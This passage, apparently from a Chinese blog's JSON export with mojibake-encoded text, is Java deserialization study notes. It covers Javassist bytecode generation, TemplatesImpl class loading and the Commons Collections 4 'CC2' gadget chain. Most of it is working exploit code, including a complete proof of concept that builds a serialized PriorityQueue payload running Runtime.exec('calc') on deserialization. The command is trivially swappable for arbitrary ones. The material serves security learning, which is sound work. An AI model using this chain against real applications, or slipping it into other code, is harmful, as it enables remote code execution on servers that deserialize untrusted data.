System.nanoTime(); test.setName(name); 4ã€è®¾ç½®è¦ç»§æ‰¿çš„ç±» test.setSuperclass(pool.get(AbstractTranslet.class.getName())); 5ã€åˆ›å»ºä¸€ä¸ªç©ºçš„ç±»åˆå§‹åŒ–å™¨ï¼ˆé™æ€æ„é€ å‡½æ•°ï¼‰ CtConstructor constructor &#x3D; test.makeClassInitializer(); 6ã€å°†å­—èŠ‚ç æ’å…¥åˆ°å¼€å¤´(å¯é€‰) constructor.insertBefore(â€œSystem.out.println(&quot;Hello,Javasist&quot;);â€); 7ã€æŒ‡å®šæ–‡ä»¶è·¯å¾„ test.writeFile(â€œ.&#x2F;â€œ); è¿™ä¸ªè·¯å¾„å°±æ˜¯é¡¹ç›®çš„æ ¹ç›®å½• ç¤ºä¾‹ä»£ç  1234567891011121314151617181920import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.*;import java.io.IOException;public class JavasistTest &#123; public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException &#123; //æ–°å»ºä¸€ä¸ªclasspoolç±»å‹çš„å¯¹è±¡ ClassPool pool = ClassPool.getDefault(); //æ·»åŠ ç±»æœç´¢è·¯å¾„ pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass test = pool.makeClass(&quot;Evil&quot;); String cmd = &quot;System.out.println(\\&quot;Hello,Javasist\\&quot;);&quot;; test.setSuperclass(pool.get(AbstractTranslet.class.getName())); CtConstructor constructor = test.makeClassInitializer(); constructor.insertBefore(cmd); test.writeFile(&quot;./&quot;); &#125;&#125; ç”Ÿæˆä¸€ä¸ªEvil.classæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ 12345678910111213141516//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;public class Evil extends AbstractTranslet &#123; static &#123; System.out.println(&quot;Hello,Javasist&quot;); &#125; public Evil() &#123; &#125;&#125; ClassLoader#defineClass ç®€ä»‹ï¼šClassLoaderæ˜¯Javaçš„ç±»åŠ è½½å™¨ï¼Œè´Ÿè´£å°†å­—èŠ‚ç è½¬åŒ–æˆå†…å­˜ä¸­çš„Javaç±»ï¼ŒClassLoaderæœ‰ä¸‰ä¸ªä¸»è¦çš„å‡½æ•°loadClassã€findClassã€defineClassï¼Œå…¶ä¸­defineClassçš„ä½œç”¨å°±æ˜¯å¤„ç†ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±»ï¼Œè¿™é‡Œå› ä¸ºåé¢éœ€è¦ç”¨åˆ°defineClassæ–¹æ³•ï¼Œè¿™é‡Œç®€å•çš„ä»‹ç»ä¸‹ ç¤ºä¾‹ä»£ç å¦‚ä¸‹ 123456789101112131415161718192021222324252627282930import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import javassist.*; import java.io.IOException; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class JavasistTest &#123; public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123; //æ–°å»ºä¸€ä¸ªclasspoolç±»å‹çš„å¯¹è±¡ ClassPool pool = ClassPool.getDefault(); //æ·»åŠ ç±»æœç´¢è·¯å¾„ pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass test = pool.makeClass(&quot;Evil&quot;); // String name = &quot;Evil&quot; + System.nanoTime(); // test.setName(name); String cmd = &quot;System.out.println(\\&quot;Hello,Javasist\\&quot;);&quot;; test.setSuperclass(pool.get(AbstractTranslet.class.getName())); CtConstructor constructor = test.makeClassInitializer(); //æ’å…¥å­—èŠ‚ç åˆ°å¼€å¤´ constructor.insertBefore(cmd); test.writeFile(&quot;./&quot;); Class cls = Class.forName(&quot;java.lang.ClassLoader&quot;); Method method = cls.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class); method.setAccessible(true); byte[] bytes = test.toBytecode(); Class clsEvil = (Class) method.invoke(ClassLoader.getSystemClassLoader(),&quot;Evil&quot;,bytes,0,bytes.length); clsEvil.newInstance(); &#125; &#125; æ‰§è¡Œåä¼šå°†æˆ‘ä»¬æ‰§è¡Œjavassistç”Ÿæˆçš„classæ–‡ä»¶ä¸­çš„å­—èŠ‚ç  æ³¨æ„ï¼šClassLoader#defineClassè¿”å›çš„ç±»å¹¶ä¸ä¼šåˆå§‹åŒ–ï¼Œåªæœ‰è¿™ä¸ªå¯¹è±¡æ˜¾å¼åœ°è°ƒç”¨å…¶æ„é€ å‡½æ•°åˆå§‹åŒ–ä»£ç æ‰èƒ½è¢«æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è™½ç„¶æ„é€ äº†ä¸€ä¸ªæ¶æ„çš„ç±»èƒ½å¤Ÿä½¿ç”¨è¿™ä¸ªdefineClassåŠ è½½ï¼Œä½†æ˜¯å®ƒä¸ä¼šæ‰§è¡Œé™æ€æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•è°ƒç”¨è¿”å›çš„ç±»çš„æ„é€ å‡½æ•°æ‰èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œå¦‚ä¸Šé¢çš„ä»£ç ä½¿ç”¨clsEvil.newInstance()åˆ›å»ºæ–°çš„å¯¹è±¡å°±ä¼šæ‰§è¡Œé™æ€æ–¹æ³•å‘ åŸå› çš„è¯ä¼°è®¡æ˜¯è¿™ä¸ªProtectionDomainç±»ä¸­æ–¹æ³•çš„ä½œç”¨åšäº†ä»€ä¹ˆé™åˆ¶ ä½†æ˜¯è¿™æ ·éœ€è¦æ˜ç¡®è°ƒç”¨æ„é€ å‡½æ•°å¹¶ä¸å¤ªå¯èƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•æ‰¾ä¸€ä¸‹æ²¡æœ‰æ˜¾å¼çš„å¯¹å®šä¹‰åŸŸè¿›è¡Œå£°æ˜çš„defineClassæ–¹æ³• é¼ æ ‡åœåœ¨defineClassæ–¹æ³•ä¸ŠæŒ‰ä½alt+F7æŸ¥æ‰¾æ‰€æœ‰çš„é‡è½½æ–¹æ³•ï¼Œæ‰¾åˆ°äº†æ¥ä¸‹æ¥è¦ä»‹ç»çš„TemplatesImplç±» TemplatesImplä¸€æ­¥æ­¥çš„åˆ†æï¼Œè‹¥æ˜¯æƒ³è¦ä½¿ç”¨defineClassæ–¹æ³•ï¼Œåˆ™éœ€è¦ä½¿ç”¨TemplatesImplçš„å†…éƒ¨ç±»TransletClassLoaderTransletClassLoader.defineClass() ç„¶åä¸€å±‚å±‚çš„æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°å“ªä¸€ä¸ªå¯ä»¥ç›´æ¥é€šè¿‡TemplatesImplè°ƒç”¨çš„ å…ˆæŸ¥çœ‹è°ƒç”¨TransletClassLoaderçš„æ–¹æ³•defineTransletClassesæ–¹æ³•è°ƒç”¨äº†TransletClassLoader ç„¶åæ ¹æ®è¿™ä¸ªæ–¹æ³•ï¼Œæœ€ç»ˆæ‰¾åˆ°ä¸€æ¡é“¾ 12345TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TransletClassLoader.defineClass() è¿™é‡Œä¸€å±‚å±‚çš„å¾€ä¸Šæ‰¾æ˜¯å› ä¸ºdefineClass()æ–¹æ³•åœ¨defineClassç±»ä¸­ï¼Œæ‰¾åˆ°defineTransletClasses()è°ƒç”¨è¯¥ç±»ï¼Œä½†æ˜¯æ˜¯privateæ–¹æ³•ï¼Œæ‰€ä»¥ç»§ç»­å¾€ä¸Šæ‰¾ï¼Œæ‰¾åˆ°ä¸€ä¸ªpublicæ–¹æ³•newTransformer()ï¼Œå¾€ä¸Šæ‰¾è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•getOutputProperties()ä¹Ÿå¯ä»¥ æ‰€ä»¥æ¥ä¸‹æ¥éœ€è¦åˆ†ææ€ä¹ˆé€šè¿‡ä»¥ä¸Šçš„é“¾å®ç°è°ƒç”¨TemplatesImplä¸­çš„defineClass()æ–¹æ³• æˆ‘ä»¬ä»newTransformer()å¼€å§‹åˆ†æ é¦–å…ˆæˆ‘ä»¬æ–°å»ºä¸€ä¸ªTemplatesImplå¯¹è±¡ï¼Œç„¶åè°ƒç”¨newTransformer()æ–¹æ³•æˆ–è€…æ˜¯getOutputProperties()æ–¹æ³•ï¼Œè¿™é‡Œä½¿ç”¨åå°„çš„æ–¹æ³•è¿›è¡Œæ“ä½œæ–¹ä¾¿ç‚¹ 12//åˆ›å»ºä¸€ä¸ªå®ä¾‹TemplatesImpl templates = TemplatesImpl.class.newInstance(); ç„¶åæˆ‘ä»¬è°ƒç”¨newTransformer()æ–¹æ³• 1templates.newTransformer(); ä½†æ˜¯è¿™æ ·æ˜¯æ— æ³•è°ƒç”¨defineClasså‡½æ•°çš„ï¼Œå…·ä½“å¦‚ä¸‹æ‰€ç¤º è°ƒç”¨newTransformer()æ–¹æ³•æ˜¯ä¸ºäº†è°ƒç”¨é‡Œé¢çš„getTransletInstance()æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°è¯¥æ–¹æ³•ä¸­_nameä¸ç­‰äºnullï¼Œ_classç­‰äºnullæ‰å¯æ‰§è¡Œæˆ‘ä»¬è¦æ‰§è¡Œçš„ä¸‹ä¸€ä¸ªå‡½æ•°defineTransletClasses() æˆ‘ä»¬è½¬åˆ°å£°æ˜å¤„ï¼Œå‘ç°æ˜¯privateå±æ€§çš„å˜é‡æ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ©ç”¨åå°„çš„æ–¹æ³•å°†è¿™ä¸¤ä¸ªå€¼è®¾ç½®ä¸€ä¸‹ï¼Œç»“åˆä¸Šé¢çš„ä»£ç å¦‚ä¸‹ 123456789101112131415161718TemplatesImpl templates = TemplatesImpl.class.newInstance();Class temp = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);//è·å–æˆå‘˜å˜é‡_nameField _name = temp.getDeclaredField(&quot;_name&quot;);//å› ä¸ºæ˜¯privateå±æ€§ï¼Œè®¾ç½®ä¸€ä¸‹å¯ä»¥ä¿®æ”¹_name.setAccessible(true);//éšä¾¿ä¼ å…¥ä¸€ä¸ªénullå€¼_name.set(templates,&quot;tttt&quot;);//è·å–æˆå‘˜å˜é‡_classField _class = temp.getDeclaredField(&quot;_class&quot;);_class.setAccessible(true);//ä¼ å…¥ä¸€ä¸ªnullå€¼_class.set(templates,null)templates.newTransformer(); ç»§ç»­å›åˆ°åˆ†æï¼Œä¸Šä¸€æ­¥å·²ç»åˆ°äº†getTransletInstance()ï¼Œå¹¶ä¸”æ¡ä»¶æˆ‘ä»¬å·²ç»é¡ºåˆ©æ»¡è¶³ï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªå‡½æ•°defineTransletClasses() å¯ä»¥çœ‹åˆ°éœ€è¦å®ç°ä¸¤ä¸ªæ¡ä»¶ï¼Œä¸€ä¸ªæ˜¯_bytecodesä¸ä¸ºnullï¼Œå…¶å®å°±æ˜¯è¦ä¼ å…¥æˆ‘ä»¬çš„æ¶æ„ç±»çš„å­—èŠ‚ç ï¼Œä¸€ä¸ªæ˜¯çˆ¶ç±»è¦æ˜¯ABSTRACT_TRANSLETï¼Œä»–ä»¬çš„ç±»å‹å’Œå€¼å¦‚ä¸‹æ‰€ç¤º çœ‹äº†ä¸€ä¸‹ï¼ŒAbstractTransletæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œåªéœ€è¦åœ¨åˆ©ç”¨javasiståˆ›å»ºæ¶æ„å­—èŠ‚ä»£ç æ—¶ç»§æ‰¿è¿™ä¸ªç±»å°±è¡Œäº† ç„¶åè°ƒç”¨defineClassæ–¹æ³•éœ€è¦æ–°å»ºTransletClassLoaderå¯¹è±¡loaderï¼Œåœ¨å…¶ä¸­å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°éœ€è¦ä½¿ç”¨_tfactoryï¼Œæ‰€ä»¥ä¿®æ”¹åçš„ä»£ç å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132ClassPool pool = ClassPool.getDefault(); //æ·»åŠ ç±»æœç´¢è·¯å¾„ pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass test = pool.makeClass(&quot;Evil&quot;); String cmd = &quot;System.out.println(\\&quot;Hello,Javasist\\&quot;);&quot;;//é€‰æ‹©ç»§æ‰¿çš„ç±»ä¸ºAbstractTranslettest.setSuperclass(pool.get(AbstractTranslet.class.getName())); CtConstructor constructor = test.makeClassInitializer(); constructor.insertBefore(cmd); test.writeFile(&quot;./&quot;); byte[] bytes = test.toBytecode();TemplatesImpl templates = TemplatesImpl.class.newInstance();Class temp = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);//ä¿®æ”¹_nameçš„å€¼Field _name = temp.getDeclaredField(&quot;_name&quot;);_name.setAccessible(true);_name.set(templates,&quot;tttt&quot;);//ä¿®æ”¹_classçš„å€¼Field _class = temp.getDeclaredField(&quot;_class&quot;);_class.setAccessible(true);_class.set(templates,null)//ä¿®æ”¹_bytecodesçš„å€¼Field _bytecodes = temp.getDeclaredField(&quot;_bytecodes&quot;); _bytecodes.setAccessible(true); _bytecodes.set(templates,new byte[][]&#123;bytes&#125;);//ä¿®æ”¹_tfactoryçš„å€¼Field _tfactory = temp.getDeclaredField(&quot;_tfactory&quot;); _tfactory.setAccessible(true); _tfactory.set(templates,new TransformerFactoryImpl());//æ‰§è¡Œæœ€å¤–é¢çš„å‡½æ•°newTransformer()templates.newTransformer(); è¿™äº›å‰ç½®çŸ¥è¯†åˆ°è¿™é‡Œå°±åˆ†æå®Œäº†ï¼Œæˆ‘ä»¬æœ€åè¦åˆ©ç”¨è¿™ä¸ªTemplatesImplå»åŠ è½½æˆ‘ä»¬ç”Ÿæˆçš„æ¶æ„å­—èŠ‚ç ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜ç¼ºä¸€ä¸ªååºåˆ—åŒ–çš„å…¥å£ï¼Œè¿™ä¸ªå…¥å£æ¥ä¸‹æ¥å°†åœ¨cc2é“¾ä¸­ä»‹ç» CC2é“¾æ¡åˆ†æcc1çš„é“¾åŠ ä¸ŠPriorityQueueé“¾ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.PriorityQueue;public class cc2Tester &#123; public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123; ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;); TransformingComparator transformingComparator = new TransformingComparator(chain); //ä¹Ÿå¯é€šè¿‡æ„é€ å‡½æ•°ç›´æ¥è¿›è¡Œä¼ å…¥ //PriorityQueue queue = new PriorityQueue(1,transformingComparator); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;); field.setAccessible(true); field.set(queue,transformingComparator); try&#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./evil.bin&quot;)); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./evil.bin&quot;)); inputStream.readObject(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; å…ˆçœ‹ä¸€çœ¼åˆ©ç”¨é“¾ 1234567891011121314ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TransletClassLoader.defineClass() newInstance() Runtime.getRuntime().exec(&quot;calc&quot;) æ³¨æ„ï¼šè¿™é‡Œå¯ä»¥ä½¿ç”¨CC1ä¸­çš„æ–¹æ³•æ¥æ„é€ æˆ‘ä»¬çš„æ¶æ„ç±»ï¼Œç„¶ååˆ©ç”¨CC2é“¾ä¸­çš„PriorityQueueä¸­çš„ååºåˆ—åŒ–ï¼Œä½†è¿™ä¸ªååºåˆ—åŒ–å€¼èƒ½å‘½ä»¤æ‰§è¡Œï¼Œä½¿ç”¨åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•å¯ä»¥ä»£ç æ‰§è¡Œ ä»£ç 1InvokerTransformer.transform()å’Œcc1ä¸­çš„ä¸€æ ·ï¼Œå°±æ˜¯é€šè¿‡åå°„æ‰§è¡ŒæŒ‡å®šå¯¹è±¡çš„å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªTemplatesImplä¸­çš„newTransformer()æ–¹æ³•ä¼ å…¥å…¶ä¸­ 1234Constructor constructor =Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class);constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer)constructor.newInstance(&quot;newTransformer&quot;); ä»£ç 2æŒ‰ç…§CC1åˆ†æä¸­çš„æ€è·¯ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ–¹æ³•æ‰§è¡Œtransform()ï¼Œå¹¶ä¸”èƒ½å¤Ÿè¢«ååºåˆ—åŒ– æœ€åæ‰¾åˆ°äº†TransformingComparatorä¸­çš„compare()æ–¹æ³• å¾ˆç¥å¥‡ï¼Œcommons-collections4ä¸­çš„è¿™ä¸ªç±»ç»§æ‰¿äº†åºåˆ—åŒ–æ¥å£ï¼Œè€Œcommons-collections3æ²¡æœ‰ç»§æ‰¿ å¯ä»¥çœ‹åˆ°compare()æ–¹æ³•ä¸­è°ƒç”¨äº†transform()æ–¹æ³• 1TransformingComparator comparator = new TransformingComparator(transformer); ä»£ç 3ä½†æ˜¯è¿™ä¸ªç±»ä¸­çš„compareæ–¹æ³•çš„å‚æ•°æ˜¯ä¸å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€ä¸ªå‚æ•°å¯æ§çš„compareæ–¹æ³•ï¼ŒæŒ‰ä½alt+F7æŸ¥æ‰¾æ‰€æœ‰çš„compareæ–¹æ³•ï¼ŒPriorityQueueç±»ä¸­çš„siftDownUsingComparator()æ–¹æ³•è°ƒç”¨äº†comparatorå¯¹è±¡çš„compareæ–¹æ³•ï¼Œå¹¶ä¸”è¿™ä¸ªcomparatorå¯¹è±¡ä¹Ÿæ˜¯å¯æ§çš„ï¼Œå¹¶ä¸”ä¼ å…¥çš„å‚æ•°xä¼šä¼ åˆ°compareæ–¹æ³•ä¸­ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œä¼šæ‰§è¡Œæˆ‘ä»¬ä¼ å…¥çš„TransformingComparatorå¯¹è±¡çš„compareæ–¹æ³• æŸ¥æ‰¾è°è°ƒç”¨äº†siftDownUsingComparator()æ–¹æ³•ï¼Œå‘ç°æ˜¯siftDown()æ–¹æ³•ï¼Œå¹¶ä¸”å‚æ•°æœ‰xå®ƒçš„é€»è¾‘æ˜¯å¦‚æœcomparatorä¸ä¸ºnullå°±è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨åå°„ä¿®æ”¹è¿™ä¸ªå€¼ä¸º TransformingComparatorå¯¹è±¡ æ¥ç€å¾€ä¸Šæ‰¾ï¼Œå‘ç°heapify()æ–¹æ³•è°ƒç”¨ï¼Œå¹¶ä¸”xçš„å€¼å°±æ˜¯queueæ•°ç»„ä¸­çš„å€¼ ä»£ç çš„é€»è¾‘å°±æ˜¯å°†sizeå³ç§»ä¸€ä½ç„¶åå‡1ï¼Œå‡å¦‚sizeæ˜¯1çš„è¯å°±æ˜¯é‚£ä¹ˆåŒ–æˆäºŒè¿›åˆ¶æ˜¯01ï¼Œå‘å³ç§»åŠ¨ä¸€ä½å°±æ˜¯00ï¼Œç„¶åå‡å»1å°±æ˜¯-1äº†ï¼Œä¸ä¼šè¿›å…¥å¾ªç¯ï¼›å¦‚æœæ˜¯2çš„è¯ï¼ŒåŒ–æˆäºŒè¿›åˆ¶å°±æ˜¯0010ï¼Œå³ç§»ä¸€ä½å°±æ˜¯0001ï¼Œç„¶åå‡å»1å°±æ˜¯0ï¼Œä¼šè¿›å…¥å¾ªç¯ï¼Œä¹Ÿå°±ä¼šæ‰§è¡ŒsiftDown()æ–¹æ³• ç»§ç»­å¾€ä¸Šæ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°readObjectæ–¹æ³•è°ƒç”¨æˆ‘ä»¬å¯æ§çš„æ–¹æ³• ä»£ç é€»è¾‘å°±æ˜¯å°†queueä¸­çš„æ¯ä¸ªå€¼éƒ½ååºåˆ—åŒ–ï¼Œç„¶åè°ƒç”¨heapify()æ–¹æ³•ï¼Œç”±ä¸Šä¸€æ­¥çš„åˆ†æå¯ä»¥çŸ¥é“ï¼Œåªè¦æˆ‘ä»¬æ§åˆ¶queueçš„å€¼å°±ä¼šè°ƒç”¨æˆ‘ä»¬åˆ†æçš„ä¸€å±‚å±‚çš„æ–¹æ³• queueæ˜¯ç¦æ­¢ååºåˆ—åŒ–çš„ï¼Œsizeæ˜¯privateå±æ€§ï¼Œä¸”åˆå§‹å€¼æ˜¯0æ‰€ä»¥queueå’Œsizeåªéœ€è¦ä½¿ç”¨åå°„ä¿®æ”¹å³å¯ æ³¨æ„ï¼šè¿™é‡Œä¸€å¼€å§‹å› ä¸ºqueueå‰é¢æœ‰transientä¿®é¥°è®©æˆ‘æœ‰ä¸€äº›ç–‘æƒ‘ï¼ŒåŠ äº†è¿™ä¸ªå…³é”®å­—åè¿™ä¸ªä¸æ˜¯ä¸èƒ½è¿›è¡Œåºåˆ—åŒ–æ“ä½œäº†å—ï¼Ÿä½†æ˜¯å‘ç°å®ƒæ˜¯å°†queueé‡Œé¢çš„å¯¹è±¡è¿›è¡Œçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œæ‰€ä»¥æˆ‘æƒ³å¯¹æˆ‘ä»¬çš„åˆ©ç”¨æ˜¯æ²¡æœ‰å½±å“çš„å§(çº¯æ¨æƒ³ï¼Œæ¬¢è¿æŒ‡æ­£ğŸ˜‰) æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬æ€»å…±éœ€è¦è®¾ç½®3ä¸ªå˜é‡ï¼šqueueã€sizeã€comparator 1234567891011121314PriorityQueue queue = new PriorityQueue(1); //è®¾ç½®queueçš„å€¼ Object[] queue_array = new Object[]&#123;templates,1&#125;; Field queue_field=Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;); queue_field.setAccessible(true); queue_field.set(queue,queue_array); //è®¾ç½®sizeçš„å€¼ Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;); size.setAccessible(true); size.set(queue,2); //è®¾ç½®comparatorçš„å€¼ Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;); comparator_field.setAccessible(true); comparator_field.set(queue,comparator); å®Œæ•´pocä»£ç å¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.*;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;import javax.xml.transform.TransformerConfigurationException;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.PriorityQueue;public class cc2Tester &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, CannotCompileException, NotFoundException, IOException, TransformerConfigurationException &#123; ClassPool pool = ClassPool.getDefault();//æ·»åŠ ç±»æœç´¢è·¯å¾„ pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass test = pool.makeClass(&quot;Evil&quot;); String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;;//é€‰æ‹©ç»§æ‰¿çš„ç±»ä¸ºAbstractTranslet test.setSuperclass(pool.get(AbstractTranslet.class.getName())); CtConstructor constructor1 = test.makeClassInitializer(); constructor1.insertBefore(cmd); test.writeFile(&quot;./&quot;); byte[] bytes = test.toBytecode(); TemplatesImpl templates = TemplatesImpl.class.newInstance(); Class temp = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);//ä¿®æ”¹_nameçš„å€¼ Field _name = temp.getDeclaredField(&quot;_name&quot;); _name.setAccessible(true); _name.set(templates,&quot;tttt&quot;);//ä¿®æ”¹_classçš„å€¼ Field _class = temp.getDeclaredField(&quot;_class&quot;); _class.setAccessible(true); _class.set(templates,null);//ä¿®æ”¹_bytecodesçš„å€¼ Field _bytecodes = temp.getDeclaredField(&quot;_bytecodes&quot;); _bytecodes.setAccessible(true); _bytecodes.set(templates,new byte[][]&#123;bytes&#125;);//ä¿®æ”¹_tfactoryçš„å€¼ Field _tfactory = temp.getDeclaredField(&quot;_tfactory&quot;); _tfactory.setAccessible(true); _tfactory.set(templates,new TransformerFactoryImpl());//æ‰§è¡Œæœ€å¤–é¢çš„å‡½æ•°newTransformer() templates.newTransformer(); Constructor constructor2 =Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class); constructor2.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer)constructor2.newInstance(&quot;newTransformer&quot;); TransformingComparator comparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); //è®¾ç½®queueçš„å€¼ Object[] queue_array = new Object[]&#123;templates,1&#125;; Field queue_field=Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;); queue_field.setAccessible(true); queue_field.set(queue,queue_array); //è®¾ç½®sizeçš„å€¼ Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;); size.setAccessible(true); size.set(queue,2); //è®¾ç½®comparatorçš„å€¼ Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;); comparator_field.setAccessible(true); comparator_field.set(queue,comparator); //åºåˆ—åŒ–ä¸ååºåˆ—åŒ– ObjectOutputStream serialize = new ObjectOutputStream(new FileOutputStream(&quot;./cc2&quot;)); serialize.writeObject(queue); serialize.close(); ObjectInputStream deserialize = new ObjectInputStream(new FileInputStream(&quot;./cc2&quot;)); deserialize.readObject(); deserialize.close(); &#125;&#125;","categories":[{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ä»£ç å®¡è®¡/java/ç¬”è®°/ååºåˆ—åŒ–","slug":"ä»£ç å®¡è®¡-java-ç¬”è®°-ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"Javaä»£ç å®¡è®¡","slug":"Javaä»£ç å®¡è®¡","date":"2023-09-21T12:13:55.000Z","updated":"2024-10-30T14:08:24.462Z","comments":true,"path":"2023/09/21/Javaä»£ç å®¡è®¡/","permalink":"http://example.com/2023/09/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"å‚è€ƒé“¾æ¥javaä»£ç å®¡è®¡ä¹‹è·¯ - Afant1 - åšå®¢å›­ (cnblogs.com) âœå†…å®¹Javaç¯å¢ƒé…ç½®java1.8+idea+tomcat IDEAå¸¸ç”¨å¿«æ·é”®F7æ­¥å…¥|F8æ­¥è¿‡|F9åˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹|ALT+F8è¯„ä¼°è¡¨è¾¾å¼|Ctrl+F æ–‡ä»¶å†…æŸ¥æ‰¾å­—ç¬¦ä¸²|åŒå‡»Shift 